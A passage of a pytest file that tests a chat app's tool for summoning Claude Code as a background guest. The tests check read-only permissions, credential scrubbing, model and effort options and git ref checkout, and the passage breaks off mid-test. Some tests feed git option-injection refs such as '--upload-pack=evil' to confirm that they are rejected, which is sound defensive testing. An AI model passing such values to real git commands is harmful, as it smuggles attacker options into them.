"""summon_claude_code: the guest is opt-in per chat,
queued by a tool call, speaks ONCE after the responder loop through the same
SSE vocabulary, persists as speaker='claude-code' with tool events and its
real cost, and the SDK options enforce each mode's loadout (read-only for
investigate; the constrained branch/test/push/PR loadout for implement).
No key or CLI needed here (the SDK boundary is mocked; option construction
is asserted directly)."""

import asyncio
import json

import pytest
from fastapi.testclient import TestClient

from backend import db, engine, guest, guestjobs
from backend import tools as tools_mod
from backend.app import create_app
from backend.config import Settings


@pytest.fixture(autouse=True)
def clean_pending():
    guest._pending.clear()
    yield
    guest._pending.clear()


@pytest.fixture
def app(tmp_path):
    settings = Settings(data_dir=str(tmp_path / "data"),
                        memory_url="http://127.0.0.1:1",
                        code_repos={"demo": str(tmp_path)})
    return create_app(settings)


def fake_stream(text_chunks):
    async def stream_reply(participant, roster, transcript, names, cfg, project,
                           chat_summary, voice_mode, tools=None, memory=None):
        for ch in text_chunks:
            yield ("text", ch)
        yield ("usage", {"input": 10, "cache_read": 2, "cache_creation": 1, "output": 5})
    return stream_reply


def fake_guest(events):
    async def run_guest(task, repo_key, context, cfg, mode="investigate",
                        resume=None, chat_id=0, model="", effort="",
                        session_key=None, ref=""):
        for ev in events:
            yield ev
    return run_guest


def sse_events(body):
    return [json.loads(line[6:]) for line in body.splitlines()
            if line.startswith("data: ")]


# ---------- schema + toggle ----------

def test_code_enabled_defaults_off_and_toggles(app):
    with TestClient(app, base_url="http://127.0.0.1") as c:
        chat = c.post("/api/chats", json={}).json()
        assert chat["code_enabled"] == 0
        chat = c.patch(f"/api/chats/{chat['id']}", json={"code_enabled": True}).json()
        assert chat["code_enabled"] == 1
        state = c.get("/api/state").json()
        assert state["chats"][0]["code_enabled"] == 1
        assert "code" in state["config"]  # availability surfaced to the UI


def test_v4_database_migrates_to_v5(tmp_path):
    data = tmp_path / "data"
    data.mkdir()
    import sqlite3
    con = sqlite3.connect(data / "chat.db")
    con.execute("CREATE TABLE chats(id INTEGER PRIMARY KEY, title TEXT)")
    con.execute("PRAGMA user_version = 4")
    con.commit()
    con.close()
    db.configure(data)
    db.init()
    con = db.connect()
    cols = [r[1] for r in con.execute("PRAGMA table_info(chats)")]
    version = con.execute("PRAGMA user_version").fetchone()[0]
    con.close()
    assert "code_enabled" in cols and version == db.SCHEMA_VERSION


# ---------- the summon tool ----------

def test_summon_queues_one_guest_turn_per_round(app):
    cfg = {"chat_id": 7, "code_repos": {"demo": "/tmp/x", "other": "/tmp/y"}}
    out = asyncio.run(tools_mod.run_tool(
        "summon_claude_code", {"task": "explain the round loop", "repo": "demo"},
        cfg, origin_agent="claude"))
    assert "will join at the end of this round" in out
    # a second summons the same round is refused, queue intact
    out2 = asyncio.run(tools_mod.run_tool(
        "summon_claude_code", {"task": "another thing", "repo": "other"}, cfg))
    assert "already summoned" in out2
    assert guest.take(7)["task"] == "explain the round loop"
    assert guest.take(7) is None  # consumed


def test_summon_validates_repo_and_defaults_sole_repo():
    cfg = {"chat_id": 1, "code_repos": {"demo": "/tmp/x"}}
    assert "unknown repo" in guest.request(1, {"task": "look at the engine",
                                               "repo": "nope"}, cfg)
    ok = guest.request(1, {"task": "look at the engine"}, cfg)  # repo omitted
    assert "repo: demo" in ok and guest.take(1)["repo"] == "demo"


def test_tool_only_offered_when_enabled_and_available(app, monkeypatch):
    seen_tools = []

    def capture(text):
        async def stream_reply(participant, roster, transcript, names, cfg, project,
                               chat_summary, voice_mode, tools=None, memory=None):
            seen_tools.append([t["name"] for t in (tools or [])])
            yield ("text", text)
        return stream_reply

    monkeypatch.setattr(engine.providers, "stream_reply", capture("ok"))
    monkeypatch.setattr(engine.guest, "available", lambda cfg: True)
    with TestClient(app, base_url="http://127.0.0.1") as c:
        chat = c.post("/api/chats", json={}).json()
        with c.stream("POST", f"/api/chats/{chat['id']}/send", json={"text": "hi"}) as r:
            "".join(r.iter_text())
        assert all("summon_claude_code" not in t for t in seen_tools)  # off by default
        c.patch(f"/api/chats/{chat['id']}", json={"code_enabled": True})
        with c.stream("POST", f"/api/chats/{chat['id']}/send", json={"text": "hi"}) as r:
            "".join(r.iter_text())
        assert any("summon_claude_code" in t for t in seen_tools[-2:])


# ---------- the guest job (decoupled from the round) ----------

def _poll(fn, tries=200, delay=0.03):
    """Drive the detached guest task by polling (each request/sleep lets the
    app's background loop advance) until `fn()` is truthy — or give up."""
    import time
    for _ in range(tries):
        val = fn()
        if val:
            return val
        time.sleep(delay)
    return None


def test_guest_runs_as_detached_job_not_an_inline_turn(app, monkeypatch):
    """The summoning round finishes with the roster only: the guest does
    NOT speak inline. It runs as a background job (a 'running' guest_job event is
    pushed) and persists its reply independently, with tool events and real
    cost, exactly like before but off the turn's critical path."""
    monkeypatch.setattr(engine.providers, "stream_reply", fake_stream(["sure "]))
    monkeypatch.setattr(engine.guest, "run_guest", fake_guest([
        ("tool", {"tool": "Read", "input": {"file_path": "engine.py"}, "output": "…"}),
        ("text", "The round loop "),
        ("text", "works like this."),
        ("usage", {"input": 100, "output": 50, "cache_read": 0,
                   "cache_creation": 0, "cost": 0.042, "session_id": "sess-1"}),
    ]))
    with TestClient(app, base_url="http://127.0.0.1") as c:
        chat = c.post("/api/chats", json={}).json()
        cid = chat["id"]
        c.patch(f"/api/chats/{cid}", json={"code_enabled": True})
        guest.request(cid, {"task": "explain the round loop"},
                      {"code_repos": {"demo": "/tmp"}, "chat_id": cid})
        with c.stream("POST", f"/api/chats/{cid}/send", json={"text": "hi"}) as r:
            body = "".join(r.iter_text())
        events = sse_events(body)
        starts = [e["speaker"] for e in events if e["type"] == "speaker_start"]
        # the round is the roster ONLY — the guest is decoupled
        assert starts == ["claude", "gpt"]
        # ...but a job is announced so its status chip can appear immediately
        job_ev = next(e for e in events if e["type"] == "guest_job")
        assert job_ev["status"] == "running" and job_ev["mode"] == "investigate"

        # the detached job completes and its reply persists out of band
        job = _poll(lambda: next(
            (j for j in c.get(f"/api/chats/{cid}/guest_jobs").json()["guest_jobs"]
             if j["status"] == "completed"), None))
        assert job and job["kind"] == "result"
        msg = _poll(lambda: next(
            (m for m in c.get(f"/api/chats/{cid}").json()["messages"]
             if m["speaker"] == "claude-code"), None))
        assert msg and msg["content"] == "The round loop works like this."
        assert msg["tool_events"][0]["tool"] == "Read"
        usage = json.loads(msg["usage_json"])
        assert usage["cost"] == 0.042 and usage["session_id"] == "sess-1"
        assert job["message_id"] == msg["id"]


def test_completed_result_is_handed_back_by_a_narrator(app, monkeypatch):
    """A routine result waits for a natural pause, then a narrating model
    hands it back: the roster reacts to the guest's freshly-persisted reply, so
    the guest is never the last word. Same mechanism the old resume path used,
    now triggered by the job's completion instead of an inline turn."""
    monkeypatch.setattr(guestjobs, "RESULT_SETTLE_S", 0.0)
    monkeypatch.setattr(engine.providers, "stream_reply", fake_stream(["ack "]))
    monkeypatch.setattr(engine.guest, "run_guest", fake_guest([
        ("text", "Looked into it — all clear."),
        ("usage", {"input": 1, "output": 1, "cache_read": 0,
                   "cache_creation": 0, "cost": 0.01, "session_id": "s"}),
    ]))
    with TestClient(app, base_url="http://127.0.0.1") as c:
        chat = c.post("/api/chats", json={}).json()
        cid = chat["id"]
        c.patch(f"/api/chats/{cid}", json={"code_enabled": True})
        guest.request(cid, {"task": "look into the fix", "mode": "investigate"},
                      {"code_repos": {"demo": "/tmp"}, "chat_id": cid})
        with c.stream("POST", f"/api/chats/{cid}/send", json={"text": "go"}) as r:
            "".join(r.iter_text())
        # the roster drains AFTER the guest reply lands — guest not the last word
        speakers = _poll(lambda: (
            (s := [m["speaker"] for m in
                   c.get(f"/api/chats/{cid}").json()["messages"]])
            and "claude-code" in s and s[-1] != "claude-code" and s) or None)
        assert speakers and speakers[-1] != "claude-code" and "claude-code" in speakers


def test_no_guest_no_extra_round(app, monkeypatch):
    """The resume fires ONLY after a guest turn: an ordinary round (no summons)
    is exactly one round, unchanged — no runaway follow-ups."""
    monkeypatch.setattr(engine.providers, "stream_reply", fake_stream(["hi"]))
    with TestClient(app, base_url="http://127.0.0.1") as c:
        chat = c.post("/api/chats", json={}).json()
        c.patch(f"/api/chats/{chat['id']}", json={"code_enabled": True})
        with c.stream("POST", f"/api/chats/{chat['id']}/send", json={"text": "go"}) as r:
            body = "".join(r.iter_text())
        starts = [e["speaker"] for e in sse_events(body) if e["type"] == "speaker_start"]
        assert starts == ["claude", "gpt"]  # one round, no resume


def test_guest_skipped_when_code_disabled_after_summons(app, monkeypatch):
    monkeypatch.setattr(engine.providers, "stream_reply", fake_stream(["ok"]))
    called = []
    monkeypatch.setattr(engine.guest, "run_guest",
                        lambda *a, **k: called.append(1) or fake_guest([])(*a, **k))
    with TestClient(app, base_url="http://127.0.0.1") as c:
        chat = c.post("/api/chats", json={}).json()  # code_enabled stays 0
        guest.request(chat["id"], {"task": "do a thing please"},
                      {"code_repos": {"demo": "/tmp"}, "chat_id": chat["id"]})
        with c.stream("POST", f"/api/chats/{chat['id']}/send", json={"text": "hi"}) as r:
            body = "".join(r.iter_text())
        assert not called
        assert all(e.get("speaker") != "claude-code" for e in sse_events(body))


def test_guest_error_fails_the_job_round_still_completes(app, monkeypatch):
    """A guest that blows up fails its JOB (visible status), while the
    round that summoned it finishes normally — the failure is decoupled from the
    turn, not reported as a cut-off inline message."""
    monkeypatch.setattr(engine.providers, "stream_reply", fake_stream(["ok"]))

    async def boom(task, repo_key, context, cfg, mode="investigate",
                   resume=None, chat_id=0, model="", effort="",
                   session_key=None, ref=""):
        raise RuntimeError("CLI exploded")
        yield  # pragma: no cover — makes this an async generator

    monkeypatch.setattr(engine.guest, "run_guest", boom)
    with TestClient(app, base_url="http://127.0.0.1") as c:
        chat = c.post("/api/chats", json={}).json()
        cid = chat["id"]
        c.patch(f"/api/chats/{cid}", json={"code_enabled": True})
        guest.request(cid, {"task": "do a thing please"},
                      {"code_repos": {"demo": "/tmp"}, "chat_id": cid})
        with c.stream("POST", f"/api/chats/{cid}/send", json={"text": "hi"}) as r:
            body = "".join(r.iter_text())
        events = sse_events(body)
        assert events[-1]["type"] == "done"  # the round finished cleanly
        job = _poll(lambda: next(
            (j for j in c.get(f"/api/chats/{cid}/guest_jobs").json()["guest_jobs"]
             if j["status"] == "failed"), None))
        assert job and "CLI exploded" in job["error"]


# ---------- SDK option construction (the read-only wall) ----------

def test_run_guest_options_enforce_read_only(tmp_path, monkeypatch):
    import claude_agent_sdk as sdk
    captured = {}

    def fake_query(*, prompt, options=None, transport=None):
        captured["prompt"] = prompt
        captured["options"] = options

        async def gen():
            yield sdk.ResultMessage(
                subtype="success", duration_ms=1, duration_api_ms=1,
                is_error=False, num_turns=1, session_id="s-1",
                total_cost_usd=0.01, usage={"input_tokens": 5, "output_tokens": 2},
                result="done")
        return gen()

    class FakeSdk:
        ClaudeAgentOptions = sdk.ClaudeAgentOptions
        AssistantMessage = sdk.AssistantMessage
        UserMessage = sdk.UserMessage
        ResultMessage = sdk.ResultMessage
        StreamEvent = sdk.StreamEvent
        TextBlock = sdk.TextBlock
        ToolUseBlock = sdk.ToolUseBlock
        ToolResultBlock = sdk.ToolResultBlock
        query = staticmethod(fake_query)

    monkeypatch.setattr(guest, "_sdk", lambda: FakeSdk)
    _git_repo(tmp_path)
    monkeypatch.setenv("CLAUDECODE", "1")           # parent session state and
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-x")  # metered key must not leak
    monkeypatch.setenv("CLAUDE_CODE_OAUTH_TOKEN", "tok")  # headless cred survives
    cfg = {"user_name": "Alex",
           "code_repos": {"demo": str(tmp_path)},
           "code_mcp": {"membro": {"command": "python",
                                   "args": ["-m", "memory_service.mcp_server"]}},
           "code_max_turns": 7, "code_timeout_s": 30}

    async def drain():
        return [ev async for ev in guest.run_guest("explain x", "demo", "ctx", cfg)]

    events = asyncio.run(drain())
    opts = captured["options"]
    assert opts.tools == ["Read", "Grep", "Glob"]           # the loadout
    assert set(opts.allowed_tools) == {
        "Read", "Grep", "Glob", "mcp__membro", "mcp__sideband-diag"}
    assert "Bash" in opts.disallowed_tools and "Write" in opts.disallowed_tools
    # headless mode + self-contained settings apply to read-only too
    assert opts.permission_mode == "dontAsk"
    assert opts.setting_sources == ["project"]
    assert opts.cwd == str(guest._worktree_path("demo", 0))  # isolated
    assert opts.max_turns == 7
    assert "membro" in opts.mcp_servers                     # memory rides along
    # get_diagnostic is always mounted — no code_mcp opt-in needed
    assert "sideband-diag" in opts.mcp_servers
    # guest authenticates via the user's own login in a clean child env
    assert opts.env.get("CLAUDECODE") == "" and opts.env.get("ANTHROPIC_API_KEY") == ""
    assert "CLAUDE_CODE_OAUTH_TOKEN" not in opts.env  # headless cred passes through
    assert opts.model is None  # no model arg, no config → override omitted

    # opt-in metered path: code_use_api_key hands the .env key to the guest
    cfg["code_use_api_key"] = True
    asyncio.run(drain())
    assert captured["options"].env.get("ANTHROPIC_API_KEY") == "sk-x"
    assert "explain x" in captured["prompt"] and "ctx" in captured["prompt"]
    # usage event carries real cost + the phase-2 resume handle. `events` is
    # the FIRST (default) run — clean env, no key restored — so its recorded
    # billing provenance is subscription, not the metered API key.
    usage = next(p for k, p in events if k == "usage")
    assert usage["cost"] == 0.01 and usage["session_id"] == "s-1"
    assert usage["auth"] == "subscription"

    # and the metered run (code_use_api_key=True, set above) stamps api_key so
    # the cost view can classify it
    metered = next(p for k, p in asyncio.run(drain()) if k == "usage")
    assert metered["auth"] == "api_key"


def test_interpolate_env_resolves_refs_and_fails_closed(monkeypatch):
    """${VAR} in a code_mcp env resolves from the process env; a missing var
    becomes "" (never the literal ${VAR}), so a mis-set secret reference hands
    the tool no credential rather than a bogus one."""
    monkeypatch.setenv("MEMORY_AUTH_TOKEN", "s3cret")
    monkeypatch.delenv("NOPE", raising=False)
    out = guest._interpolate_env({
        "MEMORY_AUTH_TOKEN": "${MEMORY_AUTH_TOKEN}",   # exact ref
        "MEMORY_API_URL": "http://127.0.0.1:8901/v1",  # plain value untouched
        "MISSING": "${NOPE}",                          # unset → ""
        "MIXED": "Bearer ${MEMORY_AUTH_TOKEN}",        # embedded ref
    })
    assert out["MEMORY_AUTH_TOKEN"] == "s3cret"
    assert out["MEMORY_API_URL"] == "http://127.0.0.1:8901/v1"
    assert out["MISSING"] == "" and "${" not in out["MISSING"]
    assert out["MIXED"] == "Bearer s3cret"


def test_code_mcp_env_ref_is_resolved_in_options(tmp_path, monkeypatch):
    """End-to-end: a code_mcp server whose env references ${MEMORY_AUTH_TOKEN}
    reaches the SDK with the resolved value — this is what lets membro-admin be
    wired to guests without pasting the token into config."""
    import claude_agent_sdk as sdk
    captured = {}

    def fake_query(*, prompt, options=None, transport=None):
        captured["options"] = options

        async def gen():
            yield sdk.ResultMessage(
                subtype="success", duration_ms=1, duration_api_ms=1,
                is_error=False, num_turns=1, session_id="s-1",
                total_cost_usd=0.0, usage={"input_tokens": 1, "output_tokens": 1},
                result="ok")
        return gen()

    class FakeSdk:
        ClaudeAgentOptions = sdk.ClaudeAgentOptions
        AssistantMessage = sdk.AssistantMessage
        UserMessage = sdk.UserMessage
        ResultMessage = sdk.ResultMessage
        StreamEvent = sdk.StreamEvent
        TextBlock = sdk.TextBlock
        ToolUseBlock = sdk.ToolUseBlock
        ToolResultBlock = sdk.ToolResultBlock
        query = staticmethod(fake_query)

    monkeypatch.setattr(guest, "_sdk", lambda: FakeSdk)
    monkeypatch.setenv("MEMORY_AUTH_TOKEN", "live-token")
    _git_repo(tmp_path)
    cfg = {"user_name": "Alex", "code_repos": {"demo": str(tmp_path)},
           "code_mcp": {"membro-admin": {
               "command": "python", "args": ["-m", "memory_service.mcp_admin_server"],
               "env": {"MEMORY_AUTH_TOKEN": "${MEMORY_AUTH_TOKEN}",
                       "MEMORY_API_URL": "http://127.0.0.1:8901/v1"}}},
           "code_max_turns": 5, "code_timeout_s": 30}

    async def drain():
        return [ev async for ev in guest.run_guest("audit", "demo", "ctx", cfg)]

    asyncio.run(drain())
    env = captured["options"].mcp_servers["membro-admin"]["env"]
    assert env["MEMORY_AUTH_TOKEN"] == "live-token"   # resolved, not literal
    assert env["MEMORY_API_URL"] == "http://127.0.0.1:8901/v1"
    assert "mcp__membro-admin" in captured["options"].allowed_tools
    assert "sideband-diag" in captured["options"].mcp_servers  # always mounted


def test_run_guest_missing_repo_path_degrades(tmp_path):
    cfg = {"code_repos": {"demo": str(tmp_path / "nope")}}

    async def drain():
        return [ev async for ev in guest.run_guest("task", "demo", "", cfg)]

    events = asyncio.run(drain())
    assert events and events[0][0] == "text" and "does not exist" in events[0][1]


# ---------- per-summon model selection (model slice) ----------

def _capturing_sdk(monkeypatch, tmp_path):
    """Monkeypatch guest._sdk with a fake that records the options passed to
    query, and prepare a git repo so the worktree step succeeds. Returns the
    dict that captures {'options', 'prompt'} on each run_guest call."""
    import claude_agent_sdk as sdk
    captured = {}

    def fake_query(*, prompt, options=None, transport=None):
        captured["prompt"] = prompt
        captured["options"] = options

        async def gen():
            yield sdk.ResultMessage(
                subtype="success", duration_ms=1, duration_api_ms=1,
                is_error=False, num_turns=1, session_id="s-1",
                total_cost_usd=0.01, usage={"input_tokens": 5, "output_tokens": 2},
                result="done")
        return gen()

    class FakeSdk:
        ClaudeAgentOptions = sdk.ClaudeAgentOptions
        AssistantMessage = sdk.AssistantMessage
        UserMessage = sdk.UserMessage
        ResultMessage = sdk.ResultMessage
        StreamEvent = sdk.StreamEvent
        TextBlock = sdk.TextBlock
        ToolUseBlock = sdk.ToolUseBlock
        ToolResultBlock = sdk.ToolResultBlock
        query = staticmethod(fake_query)

    monkeypatch.setattr(guest, "_sdk", lambda: FakeSdk)
    _git_repo(tmp_path)
    return captured


def _run_with_model(captured, cfg, model=""):
    async def drain():
        return [ev async for ev in
                guest.run_guest("t", "demo", "ctx", cfg, model=model)]
    return asyncio.run(drain())


def test_model_alias_resolution():
    # opus/sonnet/haiku pass through as the CLI's own short aliases…
    assert guest.resolve_model("opus") == "opus"
    assert guest.resolve_model("sonnet") == "sonnet"
    assert guest.resolve_model("haiku") == "haiku"
    # …"default", blank, None and anything unexpected omit the override
    for a in ("default", "", None, "gpt-5", "claude-3-opus-20240229"):
        assert guest.resolve_model(a) is None


def test_model_omitted_and_default_send_no_override(tmp_path, monkeypatch):
    captured = _capturing_sdk(monkeypatch, tmp_path)
    cfg = {"code_repos": {"demo": str(tmp_path)}}
    events = _run_with_model(captured, cfg)                # omitted
    assert captured["options"].model is None
    assert next(p for k, p in events if k == "usage")["model_alias"] == "default"
    _run_with_model(captured, cfg, model="default")       # explicit "default"
    assert captured["options"].model is None


def test_config_default_model_applies(tmp_path, monkeypatch):
    captured = _capturing_sdk(monkeypatch, tmp_path)
    cfg = {"code_repos": {"demo": str(tmp_path)}, "code_model": "sonnet"}
    events = _run_with_model(captured, cfg)                # no per-summon choice
    assert captured["options"].model == "sonnet"           # structural, not shell
    assert next(p for k, p in events if k == "usage")["model_alias"] == "sonnet"


def test_per_summon_model_overrides_config(tmp_path, monkeypatch):
    captured = _capturing_sdk(monkeypatch, tmp_path)
    cfg = {"code_repos": {"demo": str(tmp_path)}, "code_model": "sonnet"}
    events = _run_with_model(captured, cfg, model="haiku")  # summon beats config
    assert captured["options"].model == "haiku"
    assert next(p for k, p in events if k == "usage")["model_alias"] == "haiku"


def test_summon_tool_validates_and_stores_model():
    cfg = {"chat_id": 3, "code_repos": {"demo": "/tmp/x"}}
    # invalid alias rejected at the boundary — nothing queued, nothing to SDK
    bad = guest.request(3, {"task": "look at engine", "model": "gpt-5"}, cfg)
    assert "unknown model" in bad and guest.take(3) is None
    # valid alias is echoed in the ack and stored on the summons
    ok = guest.request(3, {"task": "look at engine", "model": "opus"}, cfg)
    assert "model: opus" in ok
    assert guest.take(3)["model"] == "opus"
    # omitting model stores "" (→ config/CLI default downstream)
    guest.request(3, {"task": "look at engine"}, cfg)
    assert guest.take(3)["model"] == ""


def test_summon_tool_exposes_model_enum():
    cfg = {"code_repos": {"demo": "/tmp/x"}}
    defs = tools_mod.code_tool_definitions(cfg)
    props = defs[0]["input_schema"]["properties"]
    assert props["model"]["enum"] == ["default", "opus", "sonnet", "haiku"]


# ---------- effort / thinking level ----------

def test_effort_alias_resolution():
    # the three levels map to increasing thinking-token budgets…
    assert guest.resolve_effort("think") == 4000
    assert guest.resolve_effort("think-hard") == 10000
    assert guest.resolve_effort("ultrathink") == 31999
    # …"default", blank, None and anything unexpected omit the override
    for a in ("default", "", None, "medium", "9000"):
        assert guest.resolve_effort(a) is None


def test_effort_sets_thinking_env_and_reports_alias(tmp_path, monkeypatch):
    captured = _capturing_sdk(monkeypatch, tmp_path)
    cfg = {"code_repos": {"demo": str(tmp_path)}}

    async def drain(**kw):
        return [ev async for ev in
                guest.run_guest("t", "demo", "ctx", cfg, **kw)]

    events = asyncio.run(drain(effort="ultrathink"))
    # structured budget in env, no shell/prompt injection
    assert captured["options"].env.get("MAX_THINKING_TOKENS") == "31999"
    assert next(p for k, p in events if k == "usage")["effort_alias"] == "ultrathink"
    # default/omitted → no override, reported as "default"
    events = asyncio.run(drain())
    assert "MAX_THINKING_TOKENS" not in captured["options"].env
    assert next(p for k, p in events if k == "usage")["effort_alias"] == "default"


def test_config_default_effort_applies_and_summon_overrides(tmp_path, monkeypatch):
    captured = _capturing_sdk(monkeypatch, tmp_path)
    cfg = {"code_repos": {"demo": str(tmp_path)}, "code_effort": "think"}

    async def drain(**kw):
        return [ev async for ev in
                guest.run_guest("t", "demo", "ctx", cfg, **kw)]

    asyncio.run(drain())                       # config default applies
    assert captured["options"].env.get("MAX_THINKING_TOKENS") == "4000"
    asyncio.run(drain(effort="ultrathink"))    # per-summon beats config
    assert captured["options"].env.get("MAX_THINKING_TOKENS") == "31999"


def test_summon_tool_validates_and_stores_effort():
    cfg = {"chat_id": 4, "code_repos": {"demo": "/tmp/x"}}
    bad = guest.request(4, {"task": "look at engine", "effort": "medium"}, cfg)
    assert "unknown effort" in bad and guest.take(4) is None
    ok = guest.request(4, {"task": "look at engine", "effort": "ultrathink"}, cfg)
    assert "effort: ultrathink" in ok
    assert guest.take(4)["effort"] == "ultrathink"
    guest.request(4, {"task": "look at engine"}, cfg)   # omitted → ""
    assert guest.take(4)["effort"] == ""


def test_summon_tool_exposes_effort_enum():
    cfg = {"code_repos": {"demo": "/tmp/x"}}
    defs = tools_mod.code_tool_definitions(cfg)
    props = defs[0]["input_schema"]["properties"]
    assert props["effort"]["enum"] == ["default", "think", "think-hard",
                                       "ultrathink"]


# ---------- explicit target ref / PR (host-owned checkout) -------------------

def test_summon_tool_exposes_ref():
    cfg = {"code_repos": {"demo": "/tmp/x"}}
    defs = tools_mod.code_tool_definitions(cfg)
    props = defs[0]["input_schema"]["properties"]
    # a free-form string (branch/ref or PR number/URL), NOT an enum
    assert props["ref"]["type"] == "string" and "enum" not in props["ref"]
    assert "PR" in props["ref"]["description"]


def test_summon_validates_and_stores_ref():
    cfg = {"chat_id": 5, "code_repos": {"demo": "/tmp/x"}}
    # a valid ref is stored on the summons and echoed in the ack
    ok = guest.request(5, {"task": "review the worktree PR", "ref": "154"}, cfg)
    assert "ref: 154" in ok
    assert guest.take(5)["ref"] == "154"
    # omitted → "" (host uses fresh origin/main downstream)
    guest.request(5, {"task": "look at the engine"}, cfg)
    assert guest.take(5)["ref"] == ""
    # an option-looking or whitespaced ref is refused at the boundary
    bad = guest.request(5, {"task": "look at the engine", "ref": "--upload-pack=x"}, cfg)
    assert "invalid ref" in bad and guest.take(5) is None
    bad2 = guest.request(5, {"task": "look at the engine", "ref": "two words"}, cfg)
    assert "invalid ref" in bad2 and guest.take(5) is None


def test_summon_refuses_ref_with_continue_last():
    """ref + continue_last would silently mix two working contexts — refuse it
    with a clear message, queue nothing."""
    cfg = {"chat_id": 6, "code_repos": {"demo": "/tmp/x"},
           "code_allow_writes": True}
    out = guest.request(6, {"task": "keep going but on a branch",
                            "ref": "cc/x", "continue_last": True}, cfg)
    assert "can't combine continue_last with an explicit ref" in out
    assert guest.take(6) is None


def test_parse_pr_recognises_number_hash_and_url():
    assert guest._parse_pr("154") == 154
    assert guest._parse_pr("#154") == 154
    assert guest._parse_pr("https://github.com/o/r/pull/154") == 154
    assert guest._parse_pr("https://github.com/o/r/pull/154/files") == 154
    # a branch name (even a numeric-looking one with non-digits) is not a PR
    assert guest._parse_pr("cc/155-worktree") is None
    assert guest._parse_pr("release-2") is None


def test_resolve_ref_checks_out_branch_actual_content(tmp_path):
    """A branch/ref target resolves to the branch's current commit (fetched from
    origin) and the worktree lands on exactly that content."""
    def g(repo, *a):
        subprocess.run(["git", "-C", str(repo), *a], check=True,
                       capture_output=True,
                       env={**__import__("os").environ,
                            "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@t",
                            "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@t"})
    work = _git_repo_with_origin(tmp_path)          # origin/main has pr_only.txt
    feat = tmp_path / "feat"
    subprocess.run(["git", "clone", "-q", str(tmp_path / "origin.git"), str(feat)],
                   check=True)
    g(feat, "checkout", "-q", "-b", "feature/x")
    (feat / "feature.txt").write_text("branch content")
    g(feat, "add", "-A"); g(feat, "commit", "-qm", "feat")
    g(feat, "push", "-q", "origin", "feature/x")

    sha, label = guest._resolve_ref(work, "feature/x")
    assert label == "ref feature/x" and len(sha) == 40
    wt = guest._add_worktree(work, "demo", 950001, "s1", sha)
    try:
        assert (wt / "feature.txt").read_text() == "branch content"
    finally:
        guest._remove_worktree(work, wt)


def test_resolve_ref_checks_out_unmerged_pr_head(tmp_path):
    """A PR number resolves via refs/pull/<N>/head — so a review sees UNMERGED
    PR content that never touched main (the exact live failure)."""
    def g(repo, *a):
        subprocess.run(["git", "-C", str(repo), *a], check=True,
                       capture_output=True,
                       env={**__import__("os").environ,
                            "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@t",
                            "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@t"})
    work = _git_repo_with_origin(tmp_path)
    pr = tmp_path / "pr"
    subprocess.run(["git", "clone", "-q", str(tmp_path / "origin.git"), str(pr)],
                   check=True)
    g(pr, "checkout", "-q", "-b", "pr-branch")
    (pr / "unmerged.txt").write_text("unmerged PR head")
    g(pr, "add", "-A"); g(pr, "commit", "-qm", "pr work")
    # GitHub publishes PR heads at refs/pull/<N>/head; emulate for PR #7
    g(pr, "push", "-q", "origin", "HEAD:refs/pull/7/head")

    sha, label = guest._resolve_ref(work, "7")
    assert label == "PR #7"
    wt = guest._add_worktree(work, "demo", 950002, "s2", sha)
    try:
        assert (wt / "unmerged.txt").read_text() == "unmerged PR head"
    finally:
        guest._remove_worktree(work, wt)


def test_resolve_ref_invalid_raises_never_falls_back_to_main(tmp_path):
    """An unresolvable ref is a loud preflight error — the host must NOT silently
    hand back a main worktree (that masquerade is exactly what is forbidden)."""
    work = _git_repo_with_origin(tmp_path)
    with pytest.raises(RuntimeError) as e:
        guest._resolve_ref(work, "no/such/branch")
    assert "could not resolve" in str(e.value) and "main" in str(e.value)
    # and a git-option-looking ref is rejected outright
    with pytest.raises(RuntimeError):
        guest._resolve_ref(work, "--upload-pack=evil")


def test_bad_ref_summon_refuses_join_not_stale_main(tmp_path):
    """End-to-end: run_guest with an unresolvable ref refuses to join rather than
    silently checking out main — the whole point of host-owned checkout."""
    work = _git_repo_with_origin(tmp_path)
    async def drain():
        return [ev async for ev in guest.run_guest(
            "review it", "demo", "", {"code_repos": {"demo": str(work)}},
            ref="no/such/ref")]
    events = asyncio.run(drain())
    assert events and "could not join" in events[0][1]
    assert "could not resolve" in events[0][1]


def test_run_guest_records_target_ref_in_usage_and_tells_the_guest(tmp_path, monkeypatch):
    """A ref summon: the host resolves + checks out the target, records it in the
    usage audit trail (requested ref + resolved commit), and the system prompt
    tells the guest its cwd already IS that ref — so a read-only review needs no
    git/Bash of its own."""
    import claude_agent_sdk as sdk
    captured = {}

    def fake_query(*, prompt, options=None, transport=None):
        captured["options"] = options

        async def gen():
            yield sdk.ResultMessage(
                subtype="success", duration_ms=1, duration_api_ms=1,
                is_error=False, num_turns=1, session_id="s-1", total_cost_usd=0.0,
                usage={"input_tokens": 1, "output_tokens": 1}, result="ok")
        return gen()

    class FakeSdk:
        ClaudeAgentOptions = sdk.ClaudeAgentOptions
        AssistantMessage = sdk.AssistantMessage
        UserMessage = sdk.UserMessage
        ResultMessage = sdk.ResultMessage
        StreamEvent = sdk.StreamEvent
        TextBlock = sdk.TextBlock
        ToolUseBlock = sdk.ToolUseBlock
        ToolResultBlock = sdk.ToolResultBlock
        query = staticmethod(fake_query)

    monkeypatch.setattr(guest, "_sdk", lambda: FakeSdk)

    def g(repo, *a):
        subprocess.run(["git", "-C", str(repo), *a], check=True,
                       capture_output=True,
                       env={**__import__("os").environ,
                            "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@t",
                            "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@t"})
    work = _git_repo_with_origin(tmp_path)
    feat = tmp_path / "feat"
    subprocess.run(["git", "clone", "-q", str(tmp_path / "origin.git"), str(feat)],
                   check=True)
    g(feat, "checkout", "-q", "-b", "feature/x")
    (feat / "feature.txt").write_text("branch content")
    g(feat, "add", "-A"); g(feat, "commit", "-qm", "feat")
    g(feat, "push", "-q", "origin", "feature/x")

    cfg = {"code_repos": {"demo": str(work)}}

    async def drain():
        return [ev async for ev in guest.run_guest(
            "review this branch", "demo", "ctx", cfg, ref="feature/x")]

    events = asyncio.run(drain())
    usage = next(p for k, p in events if k == "usage")
    assert usage["target_ref"] == "feature/x"
    assert len(usage["target_commit"]) == 40   # the resolved concrete commit
    # the guest is told its worktree already IS the target
